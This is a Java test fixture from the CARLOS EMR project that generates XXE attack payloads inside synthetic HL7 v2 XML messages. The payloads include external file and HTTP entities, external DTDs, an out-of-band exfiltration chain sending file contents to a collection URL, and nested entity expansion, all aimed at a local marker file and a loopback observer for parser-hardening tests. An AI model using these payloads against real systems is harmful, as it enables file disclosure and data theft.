/**
 * Copyright (c) 2026 CARLOS Contributors. All Rights Reserved.
 *
 * This software is published under the GPL GNU General Public License.
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 *
 * CARLOS EMR Project
 * https://github.com/carlos-emr/carlos
 */
package io.github.carlos_emr.carlos.commn.hl7.v2;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.CopyOnWriteArrayList;

import com.sun.net.httpserver.HttpServer;

/**
 * Synthetic XML external entity (XXE) payloads for HL7 v2 XML parsing tests (issue #5414).
 *
 * <p>Everything an attack payload could reach is disposable and local: a temporary marker file
 * that holds only a random synthetic string, and an HTTP observer bound to the loopback interface
 * on an ephemeral port. No public service is contacted and no real patient data is used. The
 * observer records every request it receives, so a test can assert that a parser made no network
 * access at all, rather than only that the marker did not surface in a parsed field.</p>
 *
 * <p>The payloads wrap a valid HL7 v2.3 {@code ADT^A01} in HAPI's XML encoding. ADT^A01 is
 * deliberately a trigger the PHS/STAR handler ignores after parsing, so the tests exercise only
 * the parser boundary and never the demographic or appointment persistence paths.</p>
 */
public final class Hl7XmlEntityAttackFixture implements AutoCloseable {

    /** Content of the synthetic marker file; random per fixture so stale output cannot match. */
    private final String fileMarker;
    /** Body the loopback observer returns for a general-entity fetch. */
    private final String httpMarker;
    private final Path markerFile;
    private final HttpServer observer;
    private final List<String> requests = new CopyOnWriteArrayList<>();

    /**
     * Creates the marker file in {@code tempDir} and starts the loopback observer.
     *
     * @param tempDir a test-owned temporary directory (deleted by JUnit after the test)
     * @throws IOException if the marker file or the observer cannot be created
     */
    public Hl7XmlEntityAttackFixture(Path tempDir) throws IOException {
        String suffix = UUID.randomUUID().toString().replace("-", "");
        this.fileMarker = "SYNTHFILEMARKER" + suffix;
        this.httpMarker = "SYNTHHTTPMARKER" + suffix;
        this.markerFile = Files.writeString(tempDir.resolve("synthetic-marker.txt"), fileMarker,
                StandardCharsets.UTF_8);
        this.observer = HttpServer.create(new InetSocketAddress(InetAddress.getLoopbackAddress(), 0), 0);
        this.observer.createContext("/", exchange -> {
            requests.add(exchange.getRequestMethod() + " " + exchange.getRequestURI());
            byte[] body = responseFor(exchange.getRequestURI().getPath()).getBytes(StandardCharsets.UTF_8);
            exchange.sendResponseHeaders(200, body.length);
            try (OutputStream out = exchange.getResponseBody()) {
                out.write(body);
            }
        });
        this.observer.start();
    }

    /**
     * Returns what the observer serves for a path. The out-of-band DTD chains a second request
     * that would carry the file marker in its query string, so a parser that loads external
     * parameter entities would leave evidence of exfiltration in {@link #requests()}.
     */
    private String responseFor(String path) {
        if (path.endsWith("/oob.dtd")) {
            return "<!ENTITY % all \"<!ENTITY exfil SYSTEM '" + baseUrl() + "/collect?%file;'>\">%all;";
        }
        if (path.endsWith(".dtd")) {
            return "<!ENTITY remote \"" + httpMarker + "\">";
        }
        return httpMarker;
    }

    /** Every request the loopback observer received, as {@code METHOD /path?query}. */
    public List<String> requests() {
        return List.copyOf(requests);
    }

    public String fileMarker() {
        return fileMarker;
    }

    public String httpMarker() {
        return httpMarker;
    }

    private String fileUri() {
        return markerFile.toUri().toString();
    }

    private String baseUrl() {
        return "http://" + observer.getAddress().getAddress().getHostAddress() + ":"
                + observer.getAddress().getPort();
    }

    /**
     * Builds a synthetic HL7 v2.3 ADT^A01 in HAPI XML encoding.
     *
     * @param doctype   text placed between the XML declaration and the root element (may be empty)
     * @param familyName text placed in PID-5.1, where an expanded entity would surface
     */
    public static String adtA01Xml(String doctype, String familyName) {
        return "<?xml version=\"1.0\"?>\n"
                + doctype
                + "<ADT_A01 xmlns=\"urn:hl7-org:v2xml\">\n"
                + "  <MSH>\n"
                + "    <MSH.1>|</MSH.1>\n"
                + "    <MSH.2>^~\\&amp;</MSH.2>\n"
                + "    <MSH.3><HD.1>PHS</HD.1></MSH.3>\n"
                + "    <MSH.4><HD.1>STAR</HD.1></MSH.4>\n"
                + "    <MSH.7><TS.1>20261029120000</TS.1></MSH.7>\n"
                + "    <MSH.9><CM_MSG.1>ADT</CM_MSG.1><CM_MSG.2>A01</CM_MSG.2></MSH.9>\n"
                + "    <MSH.10>SYNTH0001</MSH.10>\n"
                + "    <MSH.11><PT.1>P</PT.1></MSH.11>\n"
                + "    <MSH.12>2.3</MSH.12>\n"
                + "  </MSH>\n"
                + "  <EVN><EVN.1>A01</EVN.1><EVN.2><TS.1>20261029120000</TS.1></EVN.2></EVN>\n"
                + "  <PID>\n"
                + "    <PID.1>1</PID.1>\n"
                + "    <PID.3><CX.1>SYN000123</CX.1><CX.5>MR</CX.5></PID.3>\n"
                + "    <PID.5><XPN.1>" + familyName + "</XPN.1><XPN.2>PATIENT</XPN.2></PID.5>\n"
                + "    <PID.7><TS.1>19800101</TS.1></PID.7>\n"
                + "    <PID.8>F</PID.8>\n"
                + "  </PID>\n"
                + "</ADT_A01>\n";
    }

    /** A benign XML message with no DOCTYPE: the encoding legitimate HL7 XML senders produce. */
    public static String benignXml() {
        return adtA01Xml("", "SYNTHETIC");
    }

    /** The same synthetic ADT^A01 in pipe (ER7) encoding. */
    public static String benignPipe() {
        return "MSH|^~\\&|PHS|STAR|CARLOS|CARLOS|20261029120000||ADT^A01|SYNTH0001|P|2.3\r"
                + "EVN|A01|20261029120000\r"
                + "PID|1||SYN000123^^^PHS^MR||SYNTHETIC^PATIENT||19800101|F\r";
    }

    /**
     * The attack classes the parser boundary must neutralise: external general entities (file and
     * network), external parameter entities, external DTDs (SYSTEM and PUBLIC), the classic
     * out-of-band exfiltration chain, and internal entity expansion.
     */
    public enum Attack {
        EXTERNAL_GENERAL_ENTITY_FILE("external general entity (file)"),
        EXTERNAL_GENERAL_ENTITY_HTTP("external general entity (loopback http)"),
        EXTERNAL_PARAMETER_ENTITY_HTTP("external parameter entity (loopback http)"),
        EXTERNAL_DTD_SYSTEM("external DTD (SYSTEM)"),
        EXTERNAL_DTD_PUBLIC("external DTD (PUBLIC)"),
        OUT_OF_BAND_EXFILTRATION("out-of-band exfiltration chain"),
        INTERNAL_ENTITY_EXPANSION("internal entity expansion");

        private final String label;

        Attack(String label) {
            this.label = label;
        }

        @Override
        public String toString() {
            return label;
        }
    }

    /** Text an internal entity expands to; it must never surface in a parsed field. */
    public static final String INTERNAL_ENTITY_TEXT = "SYNTHAAAAAAAAAA";

    /** Renders {@code attack} against this fixture's marker file and loopback observer. */
    public String payload(Attack attack) {
        String base = baseUrl();
        return switch (attack) {
            case EXTERNAL_GENERAL_ENTITY_FILE -> adtA01Xml(
                    "<!DOCTYPE ADT_A01 [<!ENTITY ext SYSTEM \"" + fileUri() + "\">]>\n", "&ext;");
            case EXTERNAL_GENERAL_ENTITY_HTTP -> adtA01Xml(
                    "<!DOCTYPE ADT_A01 [<!ENTITY ext SYSTEM \"" + base + "/general\">]>\n", "&ext;");
            case EXTERNAL_PARAMETER_ENTITY_HTTP -> adtA01Xml(
                    "<!DOCTYPE ADT_A01 [<!ENTITY % remote SYSTEM \"" + base + "/param.dtd\"> %remote;]>\n",
                    "&remote;");
            case EXTERNAL_DTD_SYSTEM -> adtA01Xml(
                    "<!DOCTYPE ADT_A01 SYSTEM \"" + base + "/external.dtd\">\n", "SYNTHETIC");
            case EXTERNAL_DTD_PUBLIC -> adtA01Xml(
                    "<!DOCTYPE ADT_A01 PUBLIC \"-//CARLOS//SYNTHETIC//EN\" \"" + base + "/public.dtd\">\n",
                    "SYNTHETIC");
            case OUT_OF_BAND_EXFILTRATION -> adtA01Xml(
                    "<!DOCTYPE ADT_A01 [<!ENTITY % file SYSTEM \"" + fileUri() + "\">"
                            + "<!ENTITY % oob SYSTEM \"" + base + "/oob.dtd\"> %oob;]>\n",
                    "&exfil;");
            case INTERNAL_ENTITY_EXPANSION -> adtA01Xml(
                    "<!DOCTYPE ADT_A01 [<!ENTITY a \"" + INTERNAL_ENTITY_TEXT + "\">"
                            + "<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">"
                            + "<!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">]>\n",
                    "&c;");
        };
    }

    @Override
    public void close() {
        observer.stop(0);
    }
}
